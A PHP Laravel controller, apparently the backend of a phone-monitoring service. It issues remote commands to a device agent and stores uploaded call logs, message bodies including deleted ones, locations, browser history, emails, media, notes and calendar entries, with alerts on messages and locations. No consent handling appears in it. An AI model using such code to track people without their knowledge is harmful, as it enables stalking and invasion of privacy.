<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\DeviceAppActivity;
use App\Models\DeviceBrowserHistory;
use App\Models\DeviceCalendarEvent;
use App\Models\DeviceCall;
use App\Models\DeviceCommand;
use App\Models\DeviceContact;
use App\Models\DeviceDiagnostic;
use App\Models\DeviceEmail;
use App\Models\DeviceLocation;
use App\Models\DeviceMedia;
use App\Models\DeviceMessage;
use App\Models\DeviceNote;
use App\Notifications\CommandCompleted;
use App\Services\AlertEngine;
use Illuminate\Http\Request;

class AgentController extends Controller
{
    public function __construct(private readonly AlertEngine $alertEngine) {}

    public function heartbeat(Request $request)
    {
        $request->validate([
            'os_version' => 'nullable|string|max:50',
            'manufacturer' => 'nullable|string|max:100',
            'model' => 'nullable|string|max:100',
            'phone_number' => 'nullable|string|max:30',
        ]);

        $device = $request->device;
        $device->forceFill($request->only('os_version', 'manufacturer', 'model', 'phone_number'))
            ->save();

        $commands = $device->commands()
            ->where('status', 'pending')
            ->orderBy('id')
            ->get();

        if ($commands->isNotEmpty()) {
            $device->commands()
                ->whereIn('id', $commands->pluck('id'))
                ->update(['status' => 'sent', 'sent_at' => now()]);
        }

        return response()->json([
            'status' => 'ok',
            'device' => $device->name,
            'next_checkin' => now()->addMinutes(5)->toDateTimeString(),
            'commands' => $commands->map(fn (DeviceCommand $command) => [
                'id' => $command->id,
                'type' => $command->type,
                'payload' => $command->payload,
            ])->values(),
        ]);
    }

    public function acknowledge(Request $request)
    {
        $validated = $request->validate([
            'commands' => 'required|array',
            'commands.*.id' => 'required|integer',
            'commands.*.status' => 'required|in:acknowledged,failed',
            'commands.*.result' => 'nullable|string|max:255',
        ]);

        $device = $request->device;
        $counts = ['acknowledged' => 0, 'failed' => 0];

        foreach ($validated['commands'] as $entry) {
            $command = $device->commands()
                ->whereKey($entry['id'])
                ->whereIn('status', ['pending', 'sent'])
                ->first();

            if (! $command) {
                continue;
            }

            $command->update([
                'status' => $entry['status'],
                'result' => $entry['result'] ?? null,
                'acknowledged_at' => now(),
            ]);

            $counts[$entry['status']]++;

            $device->user?->notify(new CommandCompleted($command));
        }

        return response()->json([
            'status' => 'ok',
            'updated' => $counts,
        ]);
    }

    public function ingest(Request $request)
    {
        $validated = $request->validate([
            'calls' => 'sometimes|array',
            'calls.*.direction' => 'required|in:incoming,outgoing,missed',
            'calls.*.contact_name' => 'nullable|string|max:255',
            'calls.*.phone_number' => 'nullable|string|max:30',
            'calls.*.duration_seconds' => 'nullable|integer|min:0',
            'calls.*.started_at' => 'required|date',
            'messages' => 'sometimes|array',
            'messages.*.platform' => 'nullable|string|max:30',
            'messages.*.direction' => 'required|in:incoming,outgoing',
            'messages.*.contact_name' => 'nullable|string|max:255',
            'messages.*.phone_number' => 'nullable|string|max:30',
            'messages.*.body' => 'required|string',
            'messages.*.was_deleted' => 'nullable|boolean',
            'messages.*.sent_at' => 'required|date',
            'locations' => 'sometimes|array',
            'locations.*.latitude' => 'required|numeric|between:-90,90',
            'locations.*.longitude' => 'required|numeric|between:-180,180',
            'locations.*.accuracy_meters' => 'nullable|numeric|min:0',
            'locations.*.label' => 'nullable|string|max:255',
            'locations.*.recorded_at' => 'required|date',
            'apps' => 'sometimes|array',
            'apps.*.app_name' => 'required|string|max:255',
            'apps.*.package' => 'nullable|string|max:255',
            'apps.*.category' => 'nullable|string|max:100',
            'apps.*.duration_seconds' => 'nullable|integer|min:0',
            'apps.*.launched_at' => 'required|date',
            'contacts' => 'sometimes|array',
            'contacts.*.name' => 'required|string|max:255',
            'contacts.*.phone_number' => 'nullable|string|max:30',
            'contacts.*.email' => 'nullable|email|max:255',
            'browser' => 'sometimes|array',
            'browser.*.url' => 'required|string|max:2048',
            'browser.*.domain' => 'nullable|string|max:255',
            'browser.*.title' => 'nullable|string|max:255',
            'browser.*.visited_at' => 'required|date',
            'emails' => 'sometimes|array',
            'emails.*.direction' => 'required|in:incoming,outgoing',
            'emails.*.address' => 'required|string|max:255',
            'emails.*.subject' => 'nullable|string|max:255',
            'emails.*.snippet' => 'nullable|string|max:2000',
            'emails.*.sent_at' => 'required|date',
            'media' => 'sometimes|array',
            'media.*.type' => 'required|in:photo,video',
            'media.*.filename' => 'required|string|max:255',
            'media.*.size_mb' => 'nullable|numeric|min:0',
            'media.*.taken_at' => 'required|date',
            'notes' => 'sometimes|array',
            'notes.*.title' => 'required|string|max:255',
            'notes.*.body' => 'nullable|string',
            'calendar' => 'sometimes|array',
            'calendar.*.title' => 'required|string|max:255',
            'calendar.*.location' => 'nullable|string|max:255',
            'calendar.*.starts_at' => 'required|date',
            'calendar.*.ends_at' => 'nullable|date',
            'diagnostics' => 'sometimes|array',
            'diagnostics.battery_percent' => 'nullable|integer|between:0,100',
            'diagnostics.is_charging' => 'nullable|boolean',
            'diagnostics.storage_used_mb' => 'nullable|integer|min:0',
            'diagnostics.storage_total_mb' => 'nullable|integer|min:0',
            'diagnostics.network' => 'nullable|string|max:30',
            'diagnostics.recorded_at' => 'required_with:diagnostics|date',
        ]);

        $device = $request->device;
        $counts = array_fill_keys([
            'calls', 'messages', 'locations', 'apps', 'contacts', 'browser',
            'emails', 'media', 'notes', 'calendar', 'diagnostics',
        ], 0);

        foreach ($validated['calls'] ?? [] as $call) {
            DeviceCall::create(array_merge($call, [
                'device_id' => $device->id,
                'source' => 'agent',
            ]));
            $counts['calls']++;
        }

        foreach ($validated['messages'] ?? [] as $msg) {
            $message = DeviceMessage::create(array_merge($msg, [
                'device_id' => $device->id,
                'source' => 'agent',
            ]));
            $this->alertEngine->evaluateMessage($device, $message);
            $counts['messages']++;
        }

        foreach ($validated['locations'] ?? [] as $loc) {
            $location = DeviceLocation::create(array_merge($loc, [
                'device_id' => $device->id,
                'source' => 'agent',
            ]));
            $this->alertEngine->evaluateLocation($device, $location);
            $counts['locations']++;
        }

        foreach ($validated['apps'] ?? [] as $app) {
            DeviceAppActivity::create(array_merge($app, [
                'device_id' => $device->id,
                'source' => 'agent',
            ]));
            $counts['apps']++;
        }

        foreach ($validated['contacts'] ?? [] as $contact) {
            DeviceContact::firstOrCreate(
                [
                    'device_id' => $device->id,
                    'name' => $contact['name'],
                    'phone_number' => $contact['phone_number'] ?? null,
                ],
                [
                    'email' => $contact['email'] ?? null,
                    'source' => 'agent',
                ],
            );
            $counts['contacts']++;
        }

        foreach ($validated['browser'] ?? [] as $entry) {
            DeviceBrowserHistory::create(array_merge($entry, [
                'device_id' => $device->id,
                'source' => 'agent',
            ]));
            $counts['browser']++;
        }

        foreach ($validated['emails'] ?? [] as $email) {
            DeviceEmail::create(array_merge($email, [
                'device_id' => $device->id,
                'source' => 'agent',
            ]));
            $counts['emails']++;
        }

        foreach ($validated['media'] ?? [] as $medium) {
            DeviceMedia::create(array_merge($medium, [
                'device_id' => $device->id,
                'source' => 'agent',
            ]));
            $counts['media']++;
        }

        foreach ($validated['notes'] ?? [] as $note) {
            DeviceNote::create(array_merge($note, [
                'device_id' => $device->id,
                'source' => 'agent',
            ]));
            $counts['notes']++;
        }

        foreach ($validated['calendar'] ?? [] as $event) {
            DeviceCalendarEvent::create(array_merge($event, [
                'device_id' => $device->id,
                'source' => 'agent',
            ]));
            $counts['calendar']++;
        }

        if (! empty($validated['diagnostics'])) {
            DeviceDiagnostic::create(array_merge($validated['diagnostics'], [
                'device_id' => $device->id,
                'source' => 'agent',
            ]));
            $counts['diagnostics'] = 1;
        }

        return response()->json([
            'status' => 'ok',
            'ingested' => $counts,
        ]);
    }
}
